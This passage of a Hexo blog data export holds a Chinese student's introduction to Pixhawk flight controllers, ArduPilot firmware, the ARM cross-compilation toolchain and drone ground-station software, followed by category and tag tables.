rel=\"external\">Pixhawk开发者:http://dev.px4.io/</a></p>\n<hr>\n<h1 id=\"Pixhawk\"><a href=\"#Pixhawk\" class=\"headerlink\" title=\"Pixhawk\"></a>Pixhawk</h1><p>首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是”悟”系列的，说是从美国带回来的，20000RMB．~__~.所以对于我们一般的爱好者怎么办的？国外开源之王–Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱…其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.<br><img src=\"/images/pixhawk.jpg\" alt=\"梦创的板子\"></p>\n<h1 id=\"Ardupilot\"><a href=\"#Ardupilot\" class=\"headerlink\" title=\"Ardupilot\"></a>Ardupilot</h1><p>这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序<strong>ArduCopter</strong>，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制…可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入<code>make px4-v2</code>即可．键入<code>make px4-v2-upload</code>即可上载代码．我的开发平台是ubuntu 16.04 amd64.<br><img src=\"/images/targets.png\" alt=\"targets\"></p>\n<h1 id=\"交叉编译工具链\"><a href=\"#交叉编译工具链\" class=\"headerlink\" title=\"交叉编译工具链\"></a>交叉编译工具链</h1><p>熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了…具体到开发Pixhawk所用到的编译器就是<code>arm-none-eabi-gcc</code>家族,详情安装方式参考官网<a href=\"http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html\" target=\"_blank\" rel=\"external\">APM</a>或者<a href=\"http://dev.px4.io/starting-installing-linux.html\" target=\"_blank\" rel=\"external\">PX4</a>都可以，也可以看我<a href=\"http://www.nephen.com/2016/01/introduction-to-start-ArduPilot\" target=\"_blank\" rel=\"external\">学长的教程</a>,只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决…最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.<br><img src=\"/images/arm-none-eabi-gcc.png\" alt=\"arm-none-eabi-gcc\"></p>\n<h1 id=\"上位机\"><a href=\"#上位机\" class=\"headerlink\" title=\"上位机\"></a>上位机</h1><p>一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．<br><img src=\"/images/APMPlanner.png\" alt=\"APMPlanner\"></p>\n<hr>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．</p>\n","excerpt":"","more":"<h1 id=\"Pixhawk-Ardupilot-交叉编译工具链-QGC-AP\"><a href=\"#Pixhawk-Ardupilot-交叉编译工具链-QGC-AP\" class=\"headerlink\" title=\"Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)\"></a>Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)</h1><p>参考资料:<br><a href=\"http://www.nephen.com/arrange/archive.html\" title=\"老吴\">老吴学长教程:http://www.nephen.com/arrange/archive.html</a><br><a href=\"http://ardupilot.org/copter/index.html\">Ardupilot:http://ardupilot.org/copter/index.html</a><br><a href=\"http://dev.px4.io/\">Pixhawk开发者:http://dev.px4.io/</a></p>\n<hr>\n<h1 id=\"Pixhawk\"><a href=\"#Pixhawk\" class=\"headerlink\" title=\"Pixhawk\"></a>Pixhawk</h1><p>首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是”悟”系列的，说是从美国带回来的，20000RMB．~__~.所以对于我们一般的爱好者怎么办的？国外开源之王–Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱…其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.<br><img src=\"/images/pixhawk.jpg\" alt=\"梦创的板子\"></p>\n<h1 id=\"Ardupilot\"><a href=\"#Ardupilot\" class=\"headerlink\" title=\"Ardupilot\"></a>Ardupilot</h1><p>这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序<strong>ArduCopter</strong>，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制…可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入<code>make px4-v2</code>即可．键入<code>make px4-v2-upload</code>即可上载代码．我的开发平台是ubuntu 16.04 amd64.<br><img src=\"/images/targets.png\" alt=\"targets\"></p>\n<h1 id=\"交叉编译工具链\"><a href=\"#交叉编译工具链\" class=\"headerlink\" title=\"交叉编译工具链\"></a>交叉编译工具链</h1><p>熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了…具体到开发Pixhawk所用到的编译器就是<code>arm-none-eabi-gcc</code>家族,详情安装方式参考官网<a href=\"http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html\">APM</a>或者<a href=\"http://dev.px4.io/starting-installing-linux.html\">PX4</a>都可以，也可以看我<a href=\"http://www.nephen.com/2016/01/introduction-to-start-ArduPilot\">学长的教程</a>,只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决…最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.<br><img src=\"/images/arm-none-eabi-gcc.png\" alt=\"arm-none-eabi-gcc\"></p>\n<h1 id=\"上位机\"><a href=\"#上位机\" class=\"headerlink\" title=\"上位机\"></a>上位机</h1><p>一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．<br><img src=\"/images/APMPlanner.png\" alt=\"APMPlanner\"></p>\n<hr>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ciuteb7ox0006r1m1iopz5gde","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7po000br1m1rh9s9xln"},{"post_id":"ciuteb7nw0001r1m10to9vaou","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7q5000gr1m1sm4mo88f"},{"post_id":"ciuteb7p80008r1m1n8cth5wd","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7qh000jr1m1ildsbym2"},{"post_id":"ciuteb7pk000ar1m1g8y8p037","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7qw000nr1m1bpcnq6px"},{"post_id":"ciuteb7oa0002r1m1rd8tjsgp","category_id":"ciuteb7pb0009r1m1s1wvjbic","_id":"ciuteb7rg000rr1m1ty1bz07p"},{"post_id":"ciuteb7pp000cr1m1pr0djl1f","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7rz000ur1m1by0vulsp"},{"post_id":"ciuteb7ou0005r1m1iwpvy6nx","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7sc000xr1m1wgt3a1us"},{"post_id":"ciuteb7qy000or1m1firfo9ue","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7sd000zr1m1e2k49g5o"},{"post_id":"ciuteb7rq000sr1m1hjshngwj","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7sg0011r1m1wespubzi"},{"post_id":"ciuteb7rq000sr1m1hjshngwj","category_id":"ciuteb7r1000pr1m1n19eobbk","_id":"ciuteb7si0013r1m1he6otqs0"},{"post_id":"ciuteb7q8000hr1m1v537ekty","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7si0014r1m172wjkz1x"},{"post_id":"ciuteb7q8000hr1m1v537ekty","category_id":"ciuteb7r1000pr1m1n19eobbk","_id":"ciuteb7sj0015r1m101xxyv2e"},{"post_id":"ciuteb7qj000kr1m1vduevitx","category_id":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7sk0018r1m1qzat4kot"},{"post_id":"ciuteb7qj000kr1m1vduevitx","category_id":"ciuteb7s3000wr1m17wojs1p8","_id":"ciuteb7sw001ar1m1bf8gvpk6"}],"PostTag":[{"post_id":"ciuteb7pk000ar1m1g8y8p037","tag_id":"ciuteb7p70007r1m1cnjy2b0y","_id":"ciuteb7q2000fr1m1od9o4i6t"},{"post_id":"ciuteb7nw0001r1m10to9vaou","tag_id":"ciuteb7oh0003r1m1a9wrnmlp","_id":"ciuteb7qg000ir1m1reio2d1l"},{"post_id":"ciuteb7nw0001r1m10to9vaou","tag_id":"ciuteb7p70007r1m1cnjy2b0y","_id":"ciuteb7qv000mr1m1bysph5c5"},{"post_id":"ciuteb7oa0002r1m1rd8tjsgp","tag_id":"ciuteb7pz000dr1m105lx6hez","_id":"ciuteb7re000qr1m1gmb2gaek"},{"post_id":"ciuteb7ou0005r1m1iwpvy6nx","tag_id":"ciuteb7oh0003r1m1a9wrnmlp","_id":"ciuteb7s2000vr1m1wx6jqiws"},{"post_id":"ciuteb7ox0006r1m1iopz5gde","tag_id":"ciuteb7ry000tr1m1dqjyxcot","_id":"ciuteb7sg0010r1m1zukxwmfn"},{"post_id":"ciuteb7p80008r1m1n8cth5wd","tag_id":"ciuteb7ry000tr1m1dqjyxcot","_id":"ciuteb7sk0017r1m1gtaup7au"},{"post_id":"ciuteb7p80008r1m1n8cth5wd","tag_id":"ciuteb7sh0012r1m1yswieefl","_id":"ciuteb7sw0019r1m1bcsta9w8"},{"post_id":"ciuteb7pp000cr1m1pr0djl1f","tag_id":"ciuteb7ry000tr1m1dqjyxcot","_id":"ciuteb7t1001dr1m16kore9b8"},{"post_id":"ciuteb7pp000cr1m1pr0djl1f","tag_id":"ciuteb7sh0012r1m1yswieefl","_id":"ciuteb7t1001er1m1cjxsv48f"},{"post_id":"ciuteb7q8000hr1m1v537ekty","tag_id":"ciuteb7oh0003r1m1a9wrnmlp","_id":"ciuteb7t5001gr1m1aus179xx"},{"post_id":"ciuteb7q8000hr1m1v537ekty","tag_id":"ciuteb7sy001cr1m1fjzbaz8r","_id":"ciuteb7t6001hr1m167e42wl9"},{"post_id":"ciuteb7qj000kr1m1vduevitx","tag_id":"ciuteb7sh0012r1m1yswieefl","_id":"ciuteb7t8001kr1m1x40jfaca"},{"post_id":"ciuteb7qj000kr1m1vduevitx","tag_id":"ciuteb7t6001ir1m1by9hppdg","_id":"ciuteb7t8001lr1m1z9io1pg1"},{"post_id":"ciuteb7qy000or1m1firfo9ue","tag_id":"ciuteb7sh0012r1m1yswieefl","_id":"ciuteb7ta001pr1m1npl3df5h"},{"post_id":"ciuteb7qy000or1m1firfo9ue","tag_id":"ciuteb7t8001mr1m109bjtv74","_id":"ciuteb7tb001qr1m15huywke2"},{"post_id":"ciuteb7qy000or1m1firfo9ue","tag_id":"ciuteb7t9001nr1m1hfdbyltu","_id":"ciuteb7tc001sr1m1ynbtflz7"},{"post_id":"ciuteb7rq000sr1m1hjshngwj","tag_id":"ciuteb7oh0003r1m1a9wrnmlp","_id":"ciuteb7te001ur1m162sjuvhy"},{"post_id":"ciuteb7rq000sr1m1hjshngwj","tag_id":"ciuteb7t9001or1m1m732hp9t","_id":"ciuteb7te001vr1m1uv106dii"},{"post_id":"ciuteb7rq000sr1m1hjshngwj","tag_id":"ciuteb7tb001rr1m12sffjuhx","_id":"ciuteb7te001wr1m14wjbgvzn"},{"post_id":"ciuteb7rq000sr1m1hjshngwj","tag_id":"ciuteb7td001tr1m1xuabj5jo","_id":"ciuteb7tg001xr1m1i6hm18pr"}],"Tag":[{"name":"C/C++","_id":"ciuteb7oh0003r1m1a9wrnmlp"},{"name":"Linux","_id":"ciuteb7p70007r1m1cnjy2b0y"},{"name":"misc","_id":"ciuteb7pz000dr1m105lx6hez"},{"name":"Configure","_id":"ciuteb7ry000tr1m1dqjyxcot"},{"name":"network security","_id":"ciuteb7sh0012r1m1yswieefl"},{"name":"Linux kernel","_id":"ciuteb7sy001cr1m1fjzbaz8r"},{"name":"information security","_id":"ciuteb7t6001ir1m1by9hppdg"},{"name":"shell","_id":"ciuteb7t8001mr1m109bjtv74"},{"name":"pipe","_id":"ciuteb7t9001nr1m1hfdbyltu"},{"name":"emb","_id":"ciuteb7t9001or1m1m732hp9t"},{"name":"uav","_id":"ciuteb7tb001rr1m12sffjuhx"},{"name":"pixhawk","_id":"ciuteb7td001tr1m1xuabj5jo"}]}}